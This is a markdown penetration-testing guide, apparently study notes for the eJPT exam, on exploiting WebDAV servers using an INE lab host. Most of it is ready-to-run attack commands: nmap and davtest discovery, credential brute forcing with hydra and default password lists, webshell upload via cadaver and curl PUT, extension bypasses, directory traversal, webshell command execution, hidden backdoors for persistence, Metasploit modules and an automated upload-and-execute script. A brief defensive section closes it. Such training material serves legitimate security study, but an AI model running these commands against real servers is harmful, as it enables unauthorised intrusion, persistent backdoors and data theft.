# üåê WebDAV Exploitation Techniques

Comprehensive guide to exploiting WebDAV (Web Distributed Authoring and Versioning) implementations for penetration testing.

**Location in Framework:** `web-pentesting/file-upload/webdav-exploitation.md`

---

## üéØ What is WebDAV?

WebDAV extends HTTP/1.1 to support:
- **File Management** - Upload, download, move, copy files
- **Directory Operations** - Create/delete directories
- **Locking Mechanisms** - Prevent concurrent modifications
- **Property Management** - Metadata and attributes
- **Authentication** - User access control

---

## üîç WebDAV Discovery

### Nmap Discovery
```bash
# HTTP enumeration script detects WebDAV
nmap --script http-enum -sV -p 80 demo.ine.local

# Specific WebDAV scripts
nmap --script http-webdav-scan -p 80,443 target.com

# Check for WebDAV methods
nmap --script http-methods -p 80 target.com
```

### Manual Detection
```bash
# Check for WebDAV methods
curl -X OPTIONS http://target.com/webdav/

# Look for DAV header
curl -I http://target.com/webdav/
```

**Expected Response:**
```http
HTTP/1.1 200 OK
DAV: 1,2
MS-Author-Via: DAV
Allow: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
```

---

## üß™ Real Lab Exploitation (IIS WebDAV)

Based on the WebDAV IIS lab example:

### Phase 1: Discovery
```bash
# Initial port scan
nmap demo.ine.local

# Service enumeration  
nmap -sV demo.ine.local

# HTTP enumeration reveals WebDAV
nmap --script http-enum -sV -p 80 demo.ine.local
```

**Discovery Result:**
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
| http-enum: 
|   /webdav/: Potentially interesting folder (401 Unauthorized)
```

### Phase 2: Capability Assessment
```bash
# Test WebDAV without authentication (fails with 401)
davtest -url http://demo.ine.local/webdav

# Test with discovered credentials
davtest -auth bob:password_123321 -url http://demo.ine.local/webdav/
```

**Key Findings:**
- ASP files: PUT = SUCCEED, EXEC = SUCCEED
- Authentication required: Basic Auth (bob:password_123321)
- Upload directory permissions: Write enabled

### Phase 3: Webshell Upload
```bash
# Interactive upload using Cadaver
cadaver http://demo.ine.local/webdav
Username: bob
Password: password_123321

dav:/webdav/> put /usr/share/webshells/asp/webshell.asp
```

### Phase 4: Remote Code Execution
```bash
# Access webshell via browser/curl
curl "http://demo.ine.local/webdav/webshell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/webshell.asp?cmd=dir+C:\"
```

---

## üîß WebDAV HTTP Methods

### Core Methods
| Method | Purpose | Example Usage |
|--------|---------|---------------|
| **PUT** | Upload file | `curl -X PUT --data-binary @shell.asp http://target/webdav/shell.asp` |
| **GET** | Download file | `curl http://target/webdav/file.txt` |
| **DELETE** | Remove file | `curl -X DELETE http://target/webdav/shell.asp` |
| **MKCOL** | Create directory | `curl -X MKCOL http://target/webdav/newdir/` |
| **COPY** | Copy resource | `curl -X COPY -H "Destination: /webdav/copy.asp" http://target/webdav/shell.asp` |
| **MOVE** | Move/rename | `curl -X MOVE -H "Destination: /webdav/moved.asp" http://target/webdav/shell.asp` |

### Advanced Methods  
| Method | Purpose | Example Usage |
|--------|---------|---------------|
| **PROPFIND** | Get properties | `curl -X PROPFIND http://target/webdav/` |
| **PROPPATCH** | Set properties | Advanced metadata manipulation |
| **LOCK/UNLOCK** | File locking | Prevent concurrent access |
| **OPTIONS** | Discover methods | `curl -X OPTIONS http://target/webdav/` |

---

## üõ†Ô∏è Manual WebDAV Exploitation

### Using cURL for WebDAV Operations

#### File Upload (PUT Method)
```bash
# Upload webshell directly
curl -X PUT --data-binary @webshell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/shell.asp

# Upload with authentication header
curl -X PUT --data-binary @shell.php \
  -H "Authorization: Basic Ym9iOnBhc3N3b3JkXzEyMzMyMQ==" \
  http://demo.ine.local/webdav/shell.php
```

#### Directory Enumeration
```bash
# List directory contents
curl -X PROPFIND --user bob:password_123321 \
  http://demo.ine.local/webdav/

# Detailed property information
curl -X PROPFIND --user bob:password_123321 \
  -H "Depth: 1" \
  http://demo.ine.local/webdav/
```

#### File Operations
```bash
# Copy file to new location
curl -X COPY --user bob:password_123321 \
  -H "Destination: http://demo.ine.local/webdav/backup.asp" \
  http://demo.ine.local/webdav/shell.asp

# Move file (rename)
curl -X MOVE --user bob:password_123321 \
  -H "Destination: http://demo.ine.local/webdav/hidden.txt" \
  http://demo.ine.local/webdav/shell.asp
```

---

## üö® Attack Vectors and Exploitation Techniques

### 1. Credential Attacks

#### Default Credentials
```bash
# Common WebDAV default credentials
admin:admin
admin:password
webdav:webdav
test:test
guest:guest
```

#### Brute Force
```bash
# Using hydra for WebDAV brute force
hydra -L users.txt -P passwords.txt \
  demo.ine.local http-get /webdav/

# Manual testing with curl
for password in admin password 123456; do
  curl --user admin:$password \
    http://demo.ine.local/webdav/ 2>/dev/null \
    && echo "Success: admin:$password"
done
```

### 2. Directory Traversal

#### Path Manipulation
```bash
# Attempt to upload outside WebDAV directory
curl -X PUT --data-binary @shell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/../shell.asp

# Try to access system directories
curl -X PROPFIND --user bob:password_123321 \
  http://demo.ine.local/webdav/../../../
```

### 3. File Extension Bypasses

#### IIS-Specific Bypasses
```bash
# Upload as .txt then move to .asp
curl -X PUT --data-binary @shell.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/shell.txt

curl -X MOVE --user bob:password_123321 \
  -H "Destination: /webdav/shell.asp" \
  http://demo.ine.local/webdav/shell.txt
```

#### Alternative Extensions for IIS
```bash
# Try various ASP extensions
for ext in asp asa cer aspx; do
  curl -X PUT --data-binary @webshell.asp \
    --user bob:password_123321 \
    http://demo.ine.local/webdav/shell.$ext
done
```

---

## üîç WebDAV Enumeration Techniques

### Information Gathering
```bash
# Discover WebDAV methods
nmap --script http-methods --script-args http-methods.url-path=/webdav/ target.com

# Check for WebDAV vulnerabilities
nmap --script http-webdav-scan target.com

# Banner grabbing
curl -I http://target.com/webdav/
```

### Directory Discovery
```bash
# Common WebDAV directories
/webdav/
/dav/
/uploads/  
/files/
/documents/
/sharepoint/
/exchange/
/_vti_bin/
/msadc/
```

### Automated Scanning
```bash
# Nikto WebDAV scanning
nikto -h http://target.com -Cgidirs /webdav/

# DirBuster with WebDAV wordlist
dirb http://target.com/webdav/ /usr/share/dirb/wordlists/common.txt
```

---

## üõ°Ô∏è Common WebDAV Misconfigurations

### 1. Anonymous Access
```bash
# Test for anonymous write access
curl -X PUT --data-binary @test.txt http://target.com/webdav/test.txt
```

### 2. Insufficient Access Controls
```bash
# Test different user contexts
curl -X OPTIONS --user lowpriv:password http://target.com/webdav/
```

### 3. Dangerous Method Exposure
```bash
# Check for enabled dangerous methods
curl -X OPTIONS http://target.com/webdav/
```

**Look for these dangerous methods:**
- PUT (file upload)
- DELETE (file deletion)  
- MOVE (file manipulation)
- COPY (file duplication)

---

## üéØ Post-Exploitation Activities

### System Reconnaissance
```bash
# Execute commands via uploaded webshell
curl "http://demo.ine.local/webdav/shell.asp?cmd=whoami"
curl "http://demo.ine.local/webdav/shell.asp?cmd=hostname"  
curl "http://demo.ine.local/webdav/shell.asp?cmd=systeminfo"
```

### Privilege Escalation
```bash
# Check current privileges  
curl "http://demo.ine.local/webdav/shell.asp?cmd=whoami+/priv"

# Look for local users
curl "http://demo.ine.local/webdav/shell.asp?cmd=net+users"

# Check system information
curl "http://demo.ine.local/webdav/shell.asp?cmd=systeminfo"
```

### Persistence Mechanisms
```bash
# Upload additional backdoors
curl -X PUT --data-binary @backdoor.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/maintenance.asp

# Hide files in subdirectories
curl -X MKCOL --user bob:password_123321 \
  http://demo.ine.local/webdav/logs/
curl -X PUT --data-binary @persistent.asp \
  --user bob:password_123321 \
  http://demo.ine.local/webdav/logs/update.asp
```

---

## üîß Tool Integration and Automation

### Metasploit WebDAV Modules
```bash
# WebDAV scanner
use auxiliary/scanner/http/webdav_scanner
set RHOSTS target.com
run

# WebDAV upload
use exploit/windows/iis/iis_webdav_upload_asp  
set RHOSTS demo.ine.local
set HttpUsername bob
set HttpPassword password_123321
run
```

### Custom Scripts
```bash
#!/bin/bash
# WebDAV exploitation script
TARGET="http://demo.ine.local/webdav/"
USER="bob:password_123321"

echo "[+] Testing WebDAV connectivity..."
if curl -s --user $USER -X OPTIONS $TARGET | grep -q "DAV"; then
    echo "[+] WebDAV confirmed"
    
    echo "[+] Uploading webshell..."
    curl -X PUT --data-binary @webshell.asp --user $USER "${TARGET}shell.asp"
    
    echo "[+] Testing execution..."
    curl "${TARGET}shell.asp?cmd=whoami"
else
    echo "[-] WebDAV not accessible"
fi
```

---

## ‚ö†Ô∏è Defensive Considerations

### Secure WebDAV Configuration
1. **Disable unnecessary HTTP methods** (PUT, DELETE, etc.)
2. **Implement strong authentication** (avoid Basic Auth)
3. **Use SSL/TLS encryption** for all WebDAV traffic
4. **Restrict directory access** with proper permissions
5. **Enable logging and monitoring** for WebDAV activities

### Detection Indicators
- Multiple PUT/DELETE requests
- Unusual file uploads (.asp, .php files to non-development servers)
- Authentication attempts on WebDAV endpoints
- Directory traversal attempts in WebDAV paths

---

## üìù Documentation and Reporting

### Evidence Collection
1. **Screenshot of successful webshell upload**
2. **Command execution proof (whoami, systeminfo)**
3. **Directory listings showing uploaded files**
4. **Network traffic captures of WebDAV requests**

### Impact Assessment
- **Confidentiality:** Access to sensitive files
- **Integrity:** Ability to modify/upload files  
- **Availability:** Potential for denial of service

---

## üéØ eJPT Exam Focus Points

### Key Skills Required:
1. **WebDAV discovery** using Nmap and manual techniques
2. **Authentication testing** with default/weak credentials
3. **File upload exploitation** using DAVTest and Cadaver
4. **Webshell deployment** and remote command execution
5. **Documentation** of exploitation steps and impact

### Common Exam Scenarios:
- IIS server with WebDAV enabled (like the lab example)
- Apache server with mod_dav configuration
- Misconfigured SharePoint WebDAV access
- Cloud storage with WebDAV interface

### Essential Commands to Remember:
```bash
# Discovery
nmap --script http-enum -p 80 target.com

# Capability testing
davtest -auth user:pass -url http://target.com/webdav/

# File upload
cadaver http://target.com/webdav/

# Manual exploitation
curl -X PUT --data-binary @shell.asp --user user:pass http://target.com/webdav/shell.asp
```
